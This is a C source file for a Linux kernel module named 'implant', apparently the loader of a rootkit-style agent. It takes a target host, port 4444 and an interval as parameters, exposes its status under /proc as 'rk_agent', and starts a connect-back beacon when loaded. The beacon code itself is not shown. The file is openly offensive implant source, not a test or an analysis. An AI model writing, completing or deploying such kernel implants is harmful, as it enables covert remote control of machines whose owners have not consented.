// SPDX-License-Identifier: GPL-2.0
#include "implant.h"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>

static char *target = "127.0.0.1";
static ushort port = 4444;
static uint interval = 2;
module_param(target, charp, 0444);
module_param(port, ushort, 0444);
module_param(interval, uint, 0444);

static struct proc_dir_entry *status_entry;

static int status_show(struct seq_file *output, void *unused)
{
	struct beacon_status status;

	beacon_status(&status);
	seq_printf(output,
		   "target=%s\nport=%u\ninterval=%u\n"
		   "connections=%lu\nrequests=%lu\n",
		   target, port, interval, status.connections, status.requests);
	return 0;
}

static int __init implant_init(void)
{
	int error;

	if (!port || !interval)
		return -EINVAL;
	status_entry = proc_create_single("rk_agent", 0444, NULL, status_show);
	if (!status_entry)
		return -ENOMEM;
	error = beacon_start(target, port, interval);
	if (error) {
		proc_remove(status_entry);
		status_entry = NULL;
	}
	return error;
}

static void __exit implant_exit(void)
{
	beacon_stop();
	proc_remove(status_entry);
}

module_init(implant_init);
module_exit(implant_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Connect-back task agent");
